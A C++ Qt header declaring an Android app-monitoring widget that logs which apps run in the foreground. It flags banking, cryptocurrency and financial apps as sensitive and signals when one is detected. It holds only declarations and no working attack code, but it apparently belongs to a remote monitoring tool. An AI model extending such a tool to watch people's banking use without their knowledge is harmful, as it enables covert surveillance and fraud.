#ifndef APP_MONITORING_WIDGET_H
#define APP_MONITORING_WIDGET_H

#include <QWidget>
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QGridLayout>
#include <QGroupBox>
#include <QLabel>
#include <QPushButton>
#include <QTableWidget>
#include <QTableWidgetItem>
#include <QTimer>
#include <QProgressBar>
#include <QTextEdit>
#include <QListWidget>
#include <QSplitter>
#include <QComboBox>
#include <QCheckBox>
#include <memory>
#include <vector>
#include <unordered_map>

QT_BEGIN_NAMESPACE
QT_END_NAMESPACE

namespace AndroidStreamManager {

struct AppUsageData {
    QString packageName;
    QString displayName;
    QString category;
    bool isSensitive;
    qint64 firstTimeStamp;
    qint64 lastTimeStamp;
    qint64 totalTimeInForeground;
    int launchCount;

    QString getFormattedTime() const {
        qint64 seconds = totalTimeInForeground / 1000;
        qint64 minutes = seconds / 60;
        qint64 hours = minutes / 60;

        if (hours > 0) {
            return QString("%1h %2m").arg(hours).arg(minutes % 60);
        } else if (minutes > 0) {
            return QString("%1m %2s").arg(minutes).arg(seconds % 60);
        } else {
            return QString("%1s").arg(seconds);
        }
    }

    QString getCategoryIcon() const {
        if (category == "banking") return "🏦";
        if (category == "cryptocurrency") return "₿";
        if (category == "financial") return "💰";
        if (isSensitive) return "🔒";
        return "📱";
    }
};

class AppMonitoringWidget : public QWidget {
    Q_OBJECT

public:
    explicit AppMonitoringWidget(QWidget *parent = nullptr);
    ~AppMonitoringWidget();

    void startMonitoring();
    void stopMonitoring();
    void refreshData();

signals:
    void appDetected(const QString& appName, const QString& category);
    void sensitiveAppDetected(const QString& appName, const QString& category);
    void monitoringStarted();
    void monitoringStopped();

public slots:
    void onAppUsageUpdate(const QString& packageName, const QString& appName, bool isSensitive);
    void onAppStatsUpdate(const QString& statsJson);

private slots:
    void updateDisplay();
    void onStartMonitoringClicked();
    void onStopMonitoringClicked();
    void onRefreshStatsClicked();
    void onAppSelectionChanged();
    void onCategoryFilterChanged(int index);

private:
    void setupUI();
    void setupAppList();
    void setupStatsDisplay();
    void setupControls();

    void updateAppList();
    void updateStatsDisplay();
    void updateCurrentAppDisplay();

    void addAppToList(const AppUsageData& appData);
    void updateAppInList(const AppUsageData& appData);
    void filterAppsByCategory(const QString& category);

    QString formatTimestamp(qint64 timestamp) const;
    QString getCategoryColor(const QString& category) const;
    QString getSensitivityIcon(bool isSensitive) const;

    // UI Components
    QVBoxLayout* mainLayout;
    QSplitter* mainSplitter;

    // Painel esquerdo - Lista de apps
    QWidget* appsPanel;
    QVBoxLayout* appsLayout;
    QLabel* appsTitleLabel;
    QListWidget* appsListWidget;
    QLabel* currentAppLabel;
    QLabel* currentAppIconLabel;

    // Painel direito - Detalhes e controles
    QWidget* detailsPanel;
    QVBoxLayout* detailsLayout;

    // Seção de controles
    QGroupBox* controlsGroup;
    QHBoxLayout* controlsLayout;
    QPushButton* startMonitoringButton;
    QPushButton* stopMonitoringButton;
    QPushButton* refreshStatsButton;
    QCheckBox* autoRefreshCheckBox;

    // Filtro de categoria
    QHBoxLayout* filterLayout;
    QLabel* filterLabel;
    QComboBox* categoryFilterCombo;

    // Estatísticas gerais
    QGroupBox* statsGroup;
    QGridLayout* statsLayout;
    QLabel* totalAppsLabel;
    QLabel* sensitiveAppsLabel;
    QLabel* bankingAppsLabel;
    QLabel* cryptoAppsLabel;
    QLabel* monitoringTimeLabel;
    QLabel* lastUpdateLabel;

    // Detalhes do app selecionado
    QGroupBox* appDetailsGroup;
    QVBoxLayout* appDetailsLayout;
    QLabel* selectedAppNameLabel;
    QLabel* selectedAppPackageLabel;
    QLabel* selectedAppCategoryLabel;
    QLabel* selectedAppTimeLabel;
    QLabel* selectedAppLaunchesLabel;
    QLabel* selectedAppFirstSeenLabel;
    QLabel* selectedAppLastSeenLabel;

    // Log de atividades
    QGroupBox* activityLogGroup;
    QVBoxLayout* activityLogLayout;
    QTextEdit* activityLogText;

    // Dados internos
    std::unordered_map<QString, AppUsageData> appUsageData;
    QString currentForegroundApp;
    bool isMonitoringActive;
    qint64 monitoringStartTime;
    qint64 lastUpdateTime;

    // Timer para atualização automática
    QTimer* updateTimer;
};

} // namespace AndroidStreamManager

#endif // APP_MONITORING_WIDGET_H